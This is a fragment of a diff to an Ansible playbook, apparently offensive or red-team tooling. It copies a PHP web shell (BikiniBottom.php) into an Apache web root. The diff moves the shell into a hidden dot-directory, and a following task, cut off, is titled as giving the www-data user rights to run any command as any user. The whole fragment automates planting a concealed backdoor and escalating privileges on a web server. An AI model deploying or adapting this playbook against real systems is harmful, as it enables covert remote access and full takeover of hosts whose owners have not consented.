@@ -25,18 +25,18 @@
      
       - name: make target directory on linux host
         ansible.builtin.file:
-          path: /var/www/html/apache-site
+          path: /var/www/html/.apache-site
           state: directory
 
       - name: Move PHP tool into Apache Directory
         ansible.builtin.copy:
           src: /BikiniBottom-Webshell/BikiniBottom.php
-          dest: /var/www/html/apache-site/
+          dest: /var/www/html/.apache-site/
 
        - name: Move image into Apache Directory
         ansible.builtin.copy:
           src: /BikiniBottom-Webshell/spongebob.jpg
-          dest: /var/www/html/apache-site/
+          dest: /var/www/html/.apache-site/
 
       - name: Allow www-data user to run any commands as any user
         ansible.builtin.lineinfile:
